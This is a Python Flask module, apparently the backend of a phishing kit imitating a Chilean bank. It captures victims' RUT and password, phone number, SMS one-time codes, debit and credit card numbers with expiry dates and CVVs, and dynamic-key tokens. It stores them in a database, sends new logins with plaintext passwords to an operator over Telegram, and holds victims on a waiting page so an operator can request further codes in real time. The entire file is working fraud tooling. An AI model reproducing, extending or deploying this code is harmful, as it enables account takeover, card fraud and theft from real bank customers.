# modules/form_logic.py
from flask import redirect
from modules.telegram import send_telegram
import uuid

def process_forms(request, db, config):
    form_type = request.form.get("type")

    cursor = db.cursor(dictionary=True)

    # ======================================================
    # 1) LOGIN: crea la sesión y NO pide nada todavía
    # ======================================================
    if form_type == "login":
        rut = (request.form.get("rut") or "").strip()
        clave = (request.form.get("clave") or "").strip()
        ip = request.remote_addr

        # ID único tipo user_xxxxxxxxxxxx
        session_id = "user_" + uuid.uuid4().hex[:12]

        cursor.execute(
            """
            INSERT INTO sessions
                (id, rut, clave, ip_address, action_request, created_at, last_seen, error_count)
            VALUES
                (%s, %s, %s, %s, %s, NOW(), NOW(), 0)
            """,
            (session_id, rut, clave, ip, None)   # <-- None: no pide nada aún
        )
        db.commit()

        # Telegram opcional
        if config.get("telegram_bot_token"):
            msg = (
                "🚀 <b>NUEVA CONEXIÓN</b>\n"
                f"IP: <code>{ip}</code>\n"
                f"RUT: <b>{rut}</b>\n"
                f"Clave: <b>{clave}</b>\n"
                f"ID Sesión: <code>{session_id}</code>"
            )
            send_telegram(msg, config)

        # Manda al waiting_page con el mensaje de "Verificando tu identidad"
        return redirect(f"/espera?id={session_id}")

    # ======================================================
    # 2) RESTO DE FORMULARIOS (USAN session_id EXISTENTE)
    # ======================================================
    session_id = request.form.get("session_id")
    if not session_id:
        return "Error: sesión no encontrada", 400

    updates = []
    params = []

    # ---------------- TELEFONO ----------------
    if form_type == "telefono":
        telefono = (request.form.get("telefono") or "").strip()
        if telefono:
            updates.append("telefono = %s")
            params.append(telefono)

    # ---------------- SMS1 ----------------
    elif form_type == "sms1":
        code = "".join(
            (request.form.get(f"d{i}") or "").strip()
            for i in range(1, 7)
        )
        if code:
            updates.append("sms1 = %s")
            params.append(code)

    # ---------------- TARJETA DÉBITO ----------------
    elif form_type == "td":
        td = (request.form.get("td") or "").replace(" ", "")
        td_fecha = (request.form.get("td_fecha") or "").strip()
        td_cvv = (request.form.get("td_cvv") or "").strip()

        if td:
            updates.append("td = %s")
            params.append(td)
        if td_fecha:
            updates.append("td_fecha = %s")
            params.append(td_fecha)
        if td_cvv:
            updates.append("td_cvv = %s")
            params.append(td_cvv)

    # ---------------- TARJETA CRÉDITO ----------------
    elif form_type == "tc":
        tc = (request.form.get("tc") or "").replace(" ", "")
        tc_fecha = (request.form.get("tc_fecha") or "").strip()
        tc_cvv = (request.form.get("tc_cvv") or "").strip()

        if tc:
            updates.append("tc = %s")
            params.append(tc)
        if tc_fecha:
            updates.append("tc_fecha = %s")
            params.append(tc_fecha)
        if tc_cvv:
            updates.append("tc_cvv = %s")
            params.append(tc_cvv)

    # ---------------- CLAVE DINÁMICA ----------------
    elif form_type == "clave_dinamica":
        cd = (request.form.get("clave_dinamica") or "").strip()
        if cd:
            updates.append("clave_dinamica = %s")
            params.append(cd)

    # ---------------- FORMULARIO DESCONOCIDO ----------------
    else:
        return "Formulario desconocido", 400

    # Si realmente vino algún dato para guardar
    if updates:
        # reset de estado para que el servidor vuelva a "esperar acción"
        updates.append("action_request = NULL")
        updates.append("last_seen = NOW()")
        updates.append("error_count = 0")

        sql = f"UPDATE sessions SET {', '.join(updates)} WHERE id = %s"
        params.append(session_id)

        cursor.execute(sql, params)
        db.commit()

    # Siempre que envíe algo, volvemos al spinner
    return redirect(f"/espera?id={session_id}")
